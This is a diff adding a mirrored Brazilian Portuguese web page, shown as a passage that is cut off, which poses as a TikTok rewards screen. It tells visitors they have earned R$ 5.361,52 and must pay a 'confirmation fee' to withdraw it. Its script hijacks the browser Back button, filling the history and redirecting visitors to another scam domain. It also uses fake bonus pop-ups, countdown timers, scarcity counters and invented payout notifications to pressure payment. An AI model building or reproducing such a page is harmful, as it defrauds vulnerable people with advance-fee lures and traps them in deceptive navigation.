@@ -1,0 +1,3010 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<!-- Mirrored from resgate-prontoo.online/pontos/backredirect/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 20 Dec 2025 16:16:12 GMT -->
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="format-detection" content="telephone=no">
+  <link href="../../../fonts.googleapis.com/css2.1fb67.delayed?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <script src="https://cdn.jsdelivr.net/gh/davidshimjs/qrcodejs/qrcode.min.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;800;900&family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+  
+  <script>
+  // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+  const link = 'https://blackdotik11.shop/tik/back/';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
+
+
+  <!-- TikTok Pixel Code Start -->
+  <script>
+    !function(w,d,t){
+      w.TiktokAnalyticsObject=t;
+      var ttq=w[t]=w[t]||[];
+      ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"];
+      ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};
+      for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);
+      ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e};
+      ttq.load=function(e,n){
+        var r="https://analytics.tiktok.com/i18n/pixel/events.js";
+        o=n&&n.partner;
+        ttq._i=ttq._i||{};
+        ttq._i[e]=[];
+        ttq._i[e]._u=r;
+        ttq._t=ttq._t||{};
+        ttq._t[e]=+new Date;
+        ttq._o=ttq._o||{};
+        ttq._o[e]=n||{};
+        n=document.createElement("script");
+        n.type="text/javascript";
+        n.async=!0;
+        n.src=r+"?sdkid="+e+"&lib="+t;
+        e=document.getElementsByTagName("script")[0];
+        e.parentNode.insertBefore(n,e);
+      };
+      ttq.load('D4739JRC77U3KF9L5VC0');
+      ttq.page();
+      
+      (function(){
+        const urlParams = new URLSearchParams(window.location.search);
+        const ttclid = urlParams.get('ttclid');
+        if (ttclid) {
+          const d = new Date();
+          d.setTime(d.getTime() + (30 * 24 * 60 * 60 * 1000));
+          document.cookie = "ttclid=" + ttclid + ";expires=" + d.toUTCString() + ";path=/";
+        }
+      })();
+    }(window, document, 'ttq');
+  </script>
+  <!-- TikTok Pixel Code End -->
+
+  <link rel="stylesheet" href="../css/style.css">
+  <title>Taxa de Confirmação (50% OFF)</title>
+  
+  <style>
+    /* ===== ELEMENTOS APELATIVOS - CSS ===== */
+    
+    /* Banner de Urgência no Topo */
+    .urgency-banner {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      background: linear-gradient(135deg, #ff0050 0%, #ff6b35 100%);
+      color: white;
+      padding: 12px 20px;
+      text-align: center;
+      z-index: 10000;
+      box-shadow: 0 4px 20px rgba(255, 0, 80, 0.4);
+      animation: pulseBanner 2s infinite;
+    }
+    
+    @keyframes pulseBanner {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.9; }
+    }
+    
+    .urgency-banner-content {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      font-weight: 700;
+      font-size: 14px;
+    }
+    
+    .urgency-timer {
+      background: rgba(255, 255, 255, 0.2);
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-weight: 800;
+      letter-spacing: 1px;
+    }
+    
+    /* ===== COMPENSA BANNER APENAS NAS TELAS QUE USAM ===== */
+.screen:not(#nine) {
+  padding-top: 50px;
+}
+
+#nine .confirmation-header {
+  position: sticky;
+  top: 0;
+  background: #fff;
+  z-index: 10;
+}
+
+    
+    /* Mega Bônus Badge */
+    .mega-bonus-badge {
+      background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
+      border: 3px solid #FF6B00;
+      border-radius: 15px;
+      padding: 20px;
+      margin: 20px 0;
+      text-align: center;
+      box-shadow: 0 8px 30px rgba(255, 215, 0, 0.5);
+      animation: pulseGold 1.5s infinite;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .mega-bonus-badge::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+      animation: shine 3s infinite;
+    }
+    
+    @keyframes pulseGold {
+      0%, 100% { transform: scale(1); box-shadow: 0 8px 30px rgba(255, 215, 0, 0.5); }
+      50% { transform: scale(1.02); box-shadow: 0 12px 40px rgba(255, 215, 0, 0.7); }
+    }
+    
+    @keyframes shine {
+      0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+      100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+    }
+    
+    .mega-bonus-title {
+      font-size: 24px;
+      font-weight: 900;
+      color: #000;
+      margin-bottom: 8px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    
+    .mega-bonus-amount {
+      font-size: 36px;
+      font-weight: 900;
+      color: #FF0000;
+      margin: 10px 0;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
+    }
+    
+    .mega-bonus-text {
+      font-size: 16px;
+      color: #000;
+      font-weight: 600;
+      margin-top: 10px;
+    }
+    
+    /* Notificações Flutuantes */
+    
+    
+    
+    
+    @keyframes slideInRight {
+      from {
+        transform: translateX(400px);
+        opacity: 0;
+      }
+      to {
+        transform: translateX(0);
+        opacity: 1;
+      }
+    }
+    
+    @keyframes fadeOut {
+      to {
+        opacity: 0;
+        transform: translateX(400px);
+      }
+    }
+    
+    .notification-icon {
+      width: 40px;
+      height: 40px;
+      background: #ff0050;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: bold;
+      flex-shrink: 0;
+    }
+    
+    .notification-text {
+      font-size: 13px;
+      color: #333;
+      line-height: 1.4;
+    }
+    
+    .notification-name {
+      font-weight: 700;
+      color: #ff0050;
+    }
+    
+    /* Contador de Vagas */
+    .vacancies-counter {
+      background: linear-gradient(135deg, #ff0050 0%, #ff6b35 100%);
+      color: white;
+      padding: 12px 20px;
+      border-radius: 10px;
+      text-align: center;
+      margin: 15px 0;
+      font-weight: 700;
+      font-size: 16px;
+      box-shadow: 0 4px 15px rgba(255, 0, 80, 0.3);
+    }
+    
+    .vacancies-counter.low {
+      background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
+      animation: pulseRed 1s infinite;
+    }
+    
+    @keyframes pulseRed {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+    }
+    
+    .vacancies-number {
+      font-size: 24px;
+      font-weight: 900;
+      display: block;
+      margin-top: 5px;
+    }
+    
+    /* Prova Social */
+    .social-proof {
+      background: #f8f9fa;
+      border: 2px solid #ff0050;
+      border-radius: 10px;
+      padding: 15px;
+      margin: 15px 0;
+      text-align: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    
+    .social-proof-icon {
+      font-size: 24px;
+    }
+    
+    .social-proof-text {
+      font-size: 14px;
+      color: #333;
+      font-weight: 600;
+    }
+    
+    .social-proof-number {
+      color: #ff0050;
+      font-weight: 900;
+      font-size: 18px;
+    }
+    
+    /* Aviso de Perda */
+    .loss-warning {
+      background: #fff5f8;
+      border: 2px solid #ff0050;
+      border-radius: 10px;
+      padding: 15px;
+      margin: 15px 0;
+      text-align: center;
+    }
+    
+    .loss-warning.urgent {
+      background: #ffebee;
+      animation: pulseWarning 1s infinite;
+    }
+    
+    @keyframes pulseWarning {
+      0%, 100% { border-color: #ff0050; }
+      50% { border-color: #ff6b35; }
+    }
+    
+    .loss-warning-text {
+      font-size: 14px;
+      color: #000;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+    
+    .loss-warning-timer {
+      font-size: 20px;
+      font-weight: 900;
+      color: #ff0050;
+    }
+    
+    /* Exit Intent Pop-up */
+    .exit-intent-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.8);
+      z-index: 20000;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      animation: fadeIn 0.3s ease-out;
+    }
+    
+    .exit-intent-overlay.show {
+      display: flex;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    
+    .exit-intent-modal {
+      background: white;
+      border-radius: 20px;
+      padding: 30px;
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+      position: relative;
+      animation: slideUp 0.4s ease-out;
+      box-shadow: 0 10px 50px rgba(0, 0, 0, 0.3);
+    }
+    
+    @keyframes slideUp {
+      from {
+        transform: translateY(50px);
+        opacity: 0;
+      }
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+    
+    .exit-intent-close {
+      position: absolute;
+      top: 10px;
+      right: 15px;
+      background: none;
+      border: none;
+      font-size: 28px;
+      color: #999;
+      cursor: pointer;
+      line-height: 1;
+    }
+    
+    .exit-intent-title {
+      font-size: 24px;
+      font-weight: 900;
+      color: #ff0050;
+      margin-bottom: 15px;
+    }
+    
+    .exit-intent-bonus {
+      font-size: 32px;
+      font-weight: 900;
+      color: #FFD700;
+      margin: 15px 0;
+      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
+    }
+    
+    .exit-intent-text {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 25px;
+      line-height: 1.5;
+    }
+    
+    .exit-intent-buttons {
+      display: flex;
+      gap: 10px;
+      flex-direction: column;
+    }
+    
+    .exit-intent-btn {
+      padding: 15px 30px;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform 0.2s;
+    }
+    
+    .exit-intent-btn:active {
+      transform: scale(0.98);
+    }
+    
+    .exit-intent-btn-primary {
+      background: linear-gradient(135deg, #ff0050 0%, #ff6b35 100%);
+      color: white;
+    }
+    
+    .exit-intent-btn-secondary {
+      background: #f0f0f0;
+      color: #666;
+    }
+    
+    /* Botão Pulsante */
+    .confirmation-cta-button {
+      animation: pulseButton 2s infinite;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .confirmation-cta-button::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(255, 255, 255, 0.3) 0%, transparent 70%);
+      animation: glow 2s infinite;
+    }
+    
+    @keyframes pulseButton {
+      0%, 100% {
+        box-shadow: 0 0 0 0 rgba(255, 0, 80, 0.7);
+      }
+      50% {
+        box-shadow: 0 0 0 10px rgba(255, 0, 80, 0);
+      }
+    }
+    
+    @keyframes glow {
+      0% {
+        transform: translate(-50%, -50%) scale(0);
+        opacity: 1;
+      }
+      100% {
+        transform: translate(-50%, -50%) scale(1);
+        opacity: 0;
+      }
+    }
+    
+    /* Responsividade */
+    @media (max-width: 768px) {
+      .urgency-banner-content {
+        font-size: 12px;
+        flex-wrap: wrap;
+      }
+      
+      .mega-bonus-title {
+        font-size: 20px;
+      }
+      
+      .mega-bonus-amount {
+        font-size: 28px;
+      }
+      
+      
+      
+      .exit-intent-modal {
+        padding: 20px;
+      }
+    }
+  </style>
+  <style>
+/* ===== NOTIFICAÇÕES NO CANTO INFERIOR DIREITO ===== */
+
+
+.tiktok-notification {
+  background: rgba(255, 255, 255, 0.98);
+  backdrop-filter: blur(10px);
+  -webkit-backdrop-filter: blur(10px);
+  border-radius: 10px;
+  padding: 10px 12px;
+  box-shadow: 0 5px 20px rgba(0, 0, 0, 0.15);
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  transform: translateX(300px);
+  opacity: 0;
+  transition: all 0.3s ease;
+  border-left: 4px solid #ff0050;
+  pointer-events: auto;
+  max-height: 65px;
+  overflow: hidden;
+  border: 1px solid rgba(255, 255, 255, 0.3);
+}
+
+.tiktok-notification.visible {
+  transform: translateX(0);
+  opacity: 1;
+}
+
+.notification-avatar {
+  width: 40px;
+  height: 40px;
+  border-radius: 50%;
+  flex-shrink: 0;
+  background-size: cover;
+  background-position: center;
+  border: 2px solid white;
+  box-shadow: 0 3px 10px rgba(0, 0, 0, 0.15);
+}
+
+.notification-content {
+  flex: 1;
+  min-width: 0;
+}
+
+.notification-text {
+  font-size: 13px;
+  line-height: 1.3;
+  color: #333;
+  margin-bottom: 3px;
+  font-weight: 500;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  display: -webkit-box;
+  -webkit-line-clamp: 2;
+  -webkit-box-orient: vertical;
+}
+
+.notification-name {
+  font-weight: 700;
+  color: #000;
+  font-size: 13px !important;
+}
+
+.notification-value {
+  font-weight: 700;
+  color: #ff0050;
+  font-size: 12px;
+}
+
+.notification-time {
+  font-size: 11px;
+  color: #666;
+  opacity: 0.8;
+}
+
+/* ===== NOTIFICAÇÕES RETAIL (MAIS BAIXO) ===== */
+
+
+
+
+.notification-icon {
+  width: 36px;
+  height: 36px;
+  background: linear-gradient(135deg, #ff0050 0%, #ff2a6d 100%);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: white;
+  font-size: 16px;
+  font-weight: bold;
+  flex-shrink: 0;
+  box-shadow: 0 3px 8px rgba(255, 0, 80, 0.3);
+}
+
+.notification-text {
+  font-size: 13px;
+  color: #333;
+  line-height: 1.3;
+  font-weight: 500;
+}
+
+.notification-name {
+  font-weight: 700;
+  color: #ff0050;
+  font-size: 13px !important;
+}
+
+/* ===== BOTÃO FECHAR NAS NOTIFICAÇÕES TIKTOK ===== */
+.notification-close {
+  width: 22px;
+  height: 22px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: #999;
+  font-size: 18px;
+  cursor: pointer;
+  transition: all 0.2s;
+  flex-shrink: 0;
+  z-index: 1;
+  position: relative;
+  margin-left: auto;
+}
+
+.notification-close:hover {
+  background: rgba(0, 0, 0, 0.05);
+  color: #666;
+}
+
+/* ===== ANIMAÇÕES ===== */
+@keyframes slideInRight {
+  from {
+    transform: translateX(300px);
+    opacity: 0;
+  }
+  to {
+    transform: translateX(0);
+    opacity: 1;
+  }
+}
+
+@keyframes fadeOut {
+  to {
+    opacity: 0;
+    transform: translateX(300px);
+  }
+}
+
+/* ===== RESPONSIVIDADE ===== */
+@media (max-width: 768px) {
+  
+  
+  .tiktok-notification {
+    padding: 8px 10px;
+    max-height: 60px;
+    border-left-width: 3px;
+  }
+  
+  .notification-avatar {
+    width: 36px;
+    height: 36px;
+  }
+  
+  .notification-text {
+    font-size: 12px;
+  }
+  
+  .notification-name {
+    font-size: 12px !important;
+  }
+  
+  
+  
+  
+  
+  .notification-icon {
+    width: 32px;
+    height: 32px;
+    font-size: 14px;
+  }
+  
+  .notification-text {
+    font-size: 12px;
+  }
+  
+  .notification-name {
+    font-size: 12px !important;
+  }
+}
+
+@media (max-width: 480px) {
+  
+  
+  .tiktok-notification {
+    padding: 7px 9px;
+    gap: 8px;
+  }
+  
+  .notification-avatar {
+    width: 34px;
+    height: 34px;
+  }
+  
+  .notification-name {
+    font-size: 12px !important;
+  }
+  
+  .notification-value {
+    font-size: 11px;
+  }
+  
+  
+  
+  
+  
+  .notification-icon {
+    width: 30px;
+    height: 30px;
+    font-size: 13px;
+  }
+  
+  .notification-text {
+    font-size: 11px;
+  }
+  
+  .notification-name {
+    font-size: 11px !important;
+  }
+}
+
+/* Para telas muito pequenas */
+@media (max-width: 360px) {
+  
+  
+  
+}
+</style>
+
+<style>
+#notificationContainer{display:none!important;}
+
+</style>
+
+
+<style>
+/* OVERRIDE FINAL — NOTIFICAÇÃO NO CANTO INFERIOR DIREITO */
+
+</style>
+
+
+<script>
+window.__lastTikTokNotification = 0;
+window.__canNotify = function(intervalMs){
+  const now = Date.now();
+  if (now - window.__lastTikTokNotification < intervalMs) return false;
+  window.__lastTikTokNotification = now;
+  return true;
+};
+</script>
+
+</head>
+
+<body>
+
+  <!-- Container de Notificações -->
+  <!-- Exit Intent Pop-up -->
+  <div class="exit-intent-overlay" id="exitIntentOverlay">
+    <div class="exit-intent-modal">
+      <button class="exit-intent-close" onclick="closeExitIntent()">&times;</button>
+      <div class="exit-intent-title">Espere! 🎁</div>
+      <div class="exit-intent-bonus">+R$ 1.000,00 EXTRA</div>
+      <div class="exit-intent-text">
+        Não perca seu MEGA BÔNUS de R$ 1.000,00!<br>
+        Pague agora e ganhe este valor EXTRA no seu saque.
+      </div>
+      <div class="exit-intent-buttons">
+        <button class="exit-intent-btn exit-intent-btn-primary" onclick="claimBonus()">
+          Quero meu bônus de R$ 1.000,00
+        </button>
+        <button class="exit-intent-btn exit-intent-btn-secondary" onclick="closeExitIntent()">
+          Não, perder bônus
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <main id="screens">
+    <section id="one" class="screen">
+      <div class="saldo">
+        <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+          <div class="saldo-info">
+            <div class="saldo-label">
+              <span class="saldo-text">Seu saldo</span>
+              <img src="https://resgate-prontoo.online/pontos/images/p-saldo.svg" alt="" class="p-saldo">
+            </div>
+
+            <div id="saldo-valor" class="saldo-valor" aria-live="polite">
+              <span class="valor-currency valor-currency-dois valor-currency-tres" data-amount-target="5361.52">R$
+                5.361,52</span>
+            </div>
+          </div>
+
+          <div class="saldo-action">
+            <button type="button" class="btn-sacar" aria-label="Sacar" disabled="">
+              <span class="btn-text">Sacar</span>
+              <span class="pix-badge" aria-hidden="true">
+                <img src="https://resgate-prontoo.online/pontos/images/pix-logo.svg" alt="">
+              </span>
+            </button>
+          </div>
+        </div>
+      </div>
+      <div class="bloco-dois">
+        <div class="parabens">
+          <div class="parabens-txt">
+            <span class="parabens-txtum">Parabéns!</span>
+            <span class="parabens-txtdois">Você concluiu
+              <span class="nobreak">todas as tarefas</span></span>
+
+            <span class="parabens-valor">R$ 5.361,52</span>
+          </div>
+          <img src="../images/parabens-img.png" alt="" class="parabens-img">
+        </div>
+        <div class="line"></div>
+        <div class="entre">
+          <span class="entre-txt">Entre por 14 dias para ganhar
+            <span class="entre-pts">8.414 pontos</span>
+            <span class="entre-data">• 12 de nov - 25 de nov</span>
+          </span>
+          <button type="button" class="btn-concluido" aria-label="Sacar">
+            <span class="btn-concluido-text">Concluído</span>
+          </button>
+        </div>
+        <div class="concluiu">
+          <span class="concluiu-txt">Você concluiu todos os dias de check-in.</span>
+        </div>
+        <div class="dia">
+          <div class="day-tracker">
+            <div class="day-tracker__item">
+              <div class="day-tracker__box">
+                <div class="day-tracker__content">
+                  <div class="day-tracker__coin">
+                    <img src="https://resgate-prontoo.online/pontos/images/p-dia.svg" alt="">
+                  </div>
+                  <div class="day-tracker__value">50</div>
+                </div>
+
+                <div class="day-tracker__overlay">
+                  <div class="day-tracker__icon-wrapper">
+                    <div class="day-tracker__icon-shape">
+                      <img src="https://resgate-prontoo.online/pontos/images/fi-bs-check.svg" alt="">
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="day-tracker__label">Dia 01</div>
+            </div>
+
+            <div class="day-tracker__item">
+              <div class="day-tracker__box">
+                <div class="day-tracker__content">
+                  <div class="day-tracker__coin">
+                    <img src="https://resgate-prontoo.online/pontos/images/p-dia.svg" alt="">
+                  </div>
+                  <div class="day-tracker__value">100</div>
+                </div>
+
+                <div class="day-tracker__overlay">
+                  <div class="day-tracker__icon-wrapper">
+                    <div class="day-tracker__icon-shape">
+                      <img src="https://resgate-prontoo.online/pontos/images/fi-bs-check.svg" alt="">
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="day-tracker__label">Dia 02</div>
+            </div>
+
+            <div class="day-tracker__item">
+              <div class="day-tracker__box">
+                <div class="day-tracker__content">
+                  <div class="day-tracker__coin">
+                    <img src="https://resgate-prontoo.online/pontos/images/p-dia.svg" alt="">
+                  </div>
+                  <div class="day-tracker__value">150</div>
+                </div>
+
+                <div class="day-tracker__overlay">
+                  <div class="day-tracker__icon-wrapper">
+                    <div class="day-tracker__icon-shape">
+                      <img src="https://resgate-prontoo.online/pontos/images/fi-bs-check.svg" alt="">
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="day-tracker__label">Dia 03</div>
+            </div>
+
+            <div class="day-tracker__item">
+              <div class="day-tracker__box">
+                <div class="day-tracker__content">
+                  <div class="day-tracker__coin">
+                    <img src="https://resgate-prontoo.online/pontos/images/p-dia.svg" alt="">
+                  </div>
+                  <div class="day-tracker__value">200</div>
+                </div>
+
+                <div class="day-tracker__overlay">
+                  <div class="day-tracker__icon-wrapper">
+                    <div class="day-tracker__icon-shape">
+                      <img src="https://resgate-prontoo.online/pontos/images/fi-bs-check.svg" alt="">
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="day-tracker__label">Dia 04</div>
+            </div>
+
+            <div class="day-tracker__item">
+              <div class="day-tracker__box">
+                <div class="day-tracker__content">
+                  <div class="day-tracker__coin">
+                    <img src="https://resgate-prontoo.online/pontos/images/p-dia.svg" alt="">
+                  </div>
+                  <div class="day-tracker__value">250</div>
+                </div>
+
+                <div class="day-tracker__overlay">
+                  <div class="day-tracker__icon-wrapper">
+                    <div class="day-tracker__icon-shape">
+                      <img src="https://resgate-prontoo.online/pontos/images/fi-bs-check.svg" alt="">
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="day-tracker__label">Dia 05</div>
+            </div>
+
+            <div class="day-tracker__item">
+              <div class="day-tracker__box">
+                <div class="day-tracker__content">
+                  <div class="day-tracker__coin">
+                    <img src="https://resgate-prontoo.online/pontos/images/p-dia.svg" alt="">
+                  </div>
+                  <div class="day-tracker__value">300</div>
+                </div>
+
+                <div class="day-tracker__overlay">
+                  <div class="day-tracker__icon-wrapper">
+                    <div class="day-tracker__icon-shape">
+                      <img src="https://resgate-prontoo.online/pontos/images/fi-bs-check.svg" alt="">
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="day-tracker__label">Dia 06</div>
+            </div>
+          </div>
+        </div>
+        <div class="line line-dois"></div>
+
+        <div class="entre">
+          <span class="entre-txt entre-txt-dois">Vê anúncios direcionados diariamente para ganhares até
+            <span class="entre-pts">2.730 pontos</span>
+            <span class="entre-data">• 30/30 anúncios assistidos</span>
+          </span>
+          <button type="button" class="btn-concluido" aria-label="Sacar">
+            <span class="btn-concluido-text">Concluído</span>
+          </button>
+        </div>
+        <div class="line line-dois"></div>
+
+        <div class="entre">
+          <span class="entre-txt entre-txt-dois">Assistir vídeos
+            <span class="entre-pts">500 pontos</span>
+          </span>
+          <button type="button" class="btn-concluido" aria-label="Sacar">
+            <span class="btn-concluido-text">Concluído</span>
+          </button>
+        </div>
+        <div class="assista">
+          <span class="assista-txt">Assista por 10 min </span>
+          <svg class="assista-tail" xmlns="http://www.w3.org/2000/svg" width="7" height="6" viewBox="0 0 7 6"
+            fill="none">
+            <path
+              d="M4.03259 5.25C3.64769 5.91667 2.68544 5.91667 2.30054 5.25L0.135475 1.5C-0.249425 0.833333 0.231701 6.49976e-07 1.0015 5.82678e-07L5.33163 2.04126e-07C6.10143 1.36828e-07 6.58255 0.833334 6.19765 1.5L4.03259 5.25Z"
+              fill="#F1F1F1"></path>
+          </svg>
+        </div>
+        <div class="barra">
+          <div class="progress-bar">
+            <div class="progress-step">
+              <div class="step-icon">
+                <img src="https://resgate-prontoo.online/pontos/images/p-assista.svg" alt="P">
+              </div>
+              <span class="step-text">50 pontos</span>
+            </div>
+
+            <div class="progress-step">
+              <div class="step-icon">
+                <img src="https://resgate-prontoo.online/pontos/images/p-assista.svg" alt="P">
+              </div>
+              <span class="step-text">100 pontos</span>
+            </div>
+
+            <div class="progress-step">
+              <div class="step-icon">
+                <img src="https://resgate-prontoo.online/pontos/images/p-assista.svg" alt="P">
+              </div>
+              <span class="step-text">150 pontos</span>
+            </div>
+
+            <div class="progress-step">
+              <div class="step-icon">
+                <img src="https://resgate-prontoo.online/pontos/images/p-assista.svg" alt="P">
+              </div>
+              <span class="step-text">225 pontos</span>
+            </div>
+          </div>
+          <div class="line line-dois"></div>
+          <div class="entre">
+            <span class="entre-txt entre-txt-dois">Resgate suas recompensas e ganhe
+              <span class="entre-pts">640 pontos</span>
+              <span class="entre-data">• 8/8 resgatados</span>
+            </span>
+            <button type="button" class="btn-concluido" aria-label="Sacar">
+              <span class="btn-concluido-text">Concluído</span>
+            </button>
+          </div>
+          <div class="line line-dois"></div>
+          <div class="entre">
+            <span class="entre-txt entre-txt-dois">Faça 60 pesquisas diárias para ganhar até
+              <span class="entre-pts">996 pontos</span>
+              <span class="entre-data">• 60 pesquisas feitas hoje</span>
+            </span>
+            <button type="button" class="btn-concluido" aria-label="Sacar">
+              <span class="btn-concluido-text">Concluído</span>
+            </button>
+          </div>
+
+          <!-- ADICIONEI A CLASSE "posicao-direita" AQUI -->
+          <div class="assista posicao-direita">
+            <span class="assista-txt">Até 756 pontos</span>
+            <svg class="assista-tail taildois" xmlns="http://www.w3.org/2000/svg" width="7" height="6" viewBox="0 0 7 6"
+              fill="none">
+              <path
+                d="M4.03259 5.25C3.64769 5.91667 2.68544 5.91667 2.30054 5.25L0.135475 1.5C-0.249425 0.833333 0.231701 6.49976e-07 1.0015 5.82678e-07L5.33163 2.04126e-07C6.10143 1.36828e-07 6.58255 0.833334 6.19765 1.5L4.03259 5.25Z"
+                fill="#F1F1F1"></path>
+            </svg>
+          </div>
+          <div class="progress-bar">
+            <div class="progress-step hide">
+              <div class="step-icon">
+                <img src="https://resgate-prontoo.online/pontos/images/p-assista.svg" alt="P">
+              </div>
+              <span class="step-text">16 pesquisas</span>
+            </div>
+
+            <div class="progress-step">
+              <div class="step-icon">
+                <img src="https://resgate-prontoo.online/pontos/images/p-assista.svg" alt="P">
+              </div>
+              <span class="step-text">36 pesquisas</span>
+            </div>
+
+            <div class="progress-step">
+              <div class="step-icon">
+                <img src="https://resgate-prontoo.online/pontos/images/p-assista.svg" alt="P">
+              </div>
+              <span class="step-text">60 pesquisas</span>
+            </div>
+          </div>
+          <div class="obtem">
+            <span class="obtem-txt">Obtém 21 pontos por escreveres uma consulta na barra de
+              pesquisa, ou 0 ponto por tocares numa pesquisa sugerida, como em
+              "Podes gostar".</span>
+          </div>
+          <div class="line line-dois"></div>
+
+          <div class="entre">
+            <span class="entre-txt">Convide 1 amigo para se inscrever e ganhar
+              <span class="entre-pts">100.000 pontos - 200.000 pontos</span>
+            </span>
+            <button type="button" class="btn-concluido" aria-label="Sacar">
+              <span class="btn-concluido-text">Concluído</span>
+            </button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="two" class="screen" aria-hidden="true">
+      <div class="modal-inner" role="dialog" aria-modal="true" aria-labelledby="modal-title">
+        <div class="popup">
+          <img src="../images/gol.png" alt="" class="gol-img">
+          <span class="gol">Gol de Prêmios</span>
+          <span class="gol-txt">Parabéns! Como parte de uma campanha de recompensas exclusiva. </span><span
+            class="valor-currency gol-valor valor-currency-dois valor-currency-quatro" data-amount-target="5361.52">R$
+            5.361,52</span>
+          <div class="timer-wrapper expira-em-popup">
+            <div class="timer-label">Expira em</div>
+
+            <div class="timer-clock">
+              <!-- Horas -->
+              <div class="timer-box" data-timer="hours">00</div>
+              <!-- Não é usado, mas bom ter -->
+
+              <!-- Separador -->
+              <div class="timer-separator">:</div>
+
+              <!-- Minutos -->
+              <div class="timer-box" data-timer="minutes">16</div>
+              <!-- ADICIONE AQUI -->
+
+              <!-- Separador -->
+              <div class="timer-separator">:</div>
+
+              <!-- Segundos -->
+              <div class="timer-box" data-timer="seconds">38</div>
+              <!-- ADICIONE AQUI -->
+            </div>
+          </div>
+          <button type="button" class="btn-obrigado" aria-label="Obrigado" data-modal-close="">
+            <span class="btn-text btn-textdois btn-txt-obrigado">Obrigado</span>
+          </button>
+        </div>
+      </div>
+    </section>
+    <section id="three" class="screen">
+    
+      <div class="title">Resgatar recompensas</div>
+      <div class="saldo saldo-dois">
+        <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+          <div class="saldo-info saldo-info-dois">
+            <div class="saldo-label">
+              <span class="saldo-text saldo-text-dois">Seu saldo</span>
+            </div>
+
+            <div class="saldo-valor saldo-valor-dois" aria-live="polite">
+              <span class="valor-currency valor-currency-dois" data-amount-target="5361.52">R$5.361,52</span>
+              <span class="total-pontos">= 53.615.200 pontos (s)</span>
+            </div>
+          </div>
+
+          <div class="saldo-action">
+            <span class="saldo-img"><img src="../images/p-saldo-maior.png" alt="" class="p-saldo p-saldo-maior"></span>
+          </div>
+        </div>
+      </div>
+      <div class="linha"></div>
+      <div class="saldo saldo-tres">
+        <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+          <div class="saldo-info saldo-info-dois">
+            <div class="saldo-valor saldo-valor-dois" aria-live="polite">
